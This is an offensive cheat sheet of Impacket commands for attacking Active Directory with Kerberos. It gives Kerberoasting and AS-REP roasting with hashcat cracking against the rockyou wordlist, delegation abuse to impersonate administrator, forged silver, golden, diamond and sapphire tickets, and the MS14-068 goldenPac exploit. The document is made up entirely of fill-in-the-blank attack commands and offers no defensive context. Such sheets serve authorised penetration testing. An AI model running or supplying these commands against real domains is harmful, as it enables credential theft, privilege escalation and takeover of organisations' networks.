# impacket
#target/remote #os/linux #cat/ad

## GetTGT
```
getTGT.py <domain>/'<user>'<impacket_auth>;export KRB5CCNAME=$(pwd)/'<user>'.ccache
```

## Kerberoast
```
GetUserSPNs.py -request -outputfile hashes.kerberoast <domain>/'<user>'<impacket_auth>; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

## Kerberoast with no-preauth user
```
GetUserSPNs.py -request -no-preauth <no-preauth_user> -usersfile <usersfile|users.txt> -outputfile hashes.kerberoast <domain>/; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

## ASREPRoast with usersfile
```
GetNPUsers.py -usersfile <usersfile|users.txt> -outputfile hashes.asreproast <domain>/;hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
```

## ASREPRoast with authentication
```
GetNPUsers.py -request -outputfile hashes.asreproast <domain>/'<user>'<impacket_auth>;hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
```

## KCD/RBCD (principal requires SPN!)
```
getST.py -spn <service|cifs>/<fqdn> -impersonate <imp_acc|administrator> <domain>/'<user>'<impacket_auth>
```

## s4u2self
```
getST.py -self -altservice <service|cifs>/<fqdn> -impersonate <imp_acc|administrator> <domain>/'<user>'<impacket_auth>
```

## s4u2proxy
```
getST.py -spn <service|cifs>/<fqdn> -additional-ticket <ticket_file> -impersonate <imp_acc|administrator> <domain>/'<user>'<impacket_auth>
```

## ticketer silver ticket
```
ticketer.py -nthash <service_nthash> -domain-sid <domain_sid> -domain <domain> -spn <spn> '<user>'
```

## ticketer golden ticket
```
ticketer.py -nthash <krbtgt_nthash> -domain-sid <domain_sid> -domain <domain> '<user>'
```

## ticketer diamond ticket
```
ticketer.py -request -domain <domain> -user '<user>' -password <password> -nthash <nt_hash> -aesKey <aes_key> -domain-sid <domain_sid> -user-id <user_id> -groups <groups> <target_user>
```

## ticketer sapphire ticket
```
ticketer.py -aesKey <principal_krbtgt_aes_key> -domain <principal_domain> -domain-sid <principal_domain_sid> -extra-sid <target_domain_sid>-519 Administrator
```

## ms14-068 - goldenpac
```
goldenPac.py -dc-ip <dc_ip> <domain>/'<user>'<impacket_target_auth>
```

## Export KRB5CCNAME
```
export KRB5CCNAME=$(pwd)/<ccache>
```
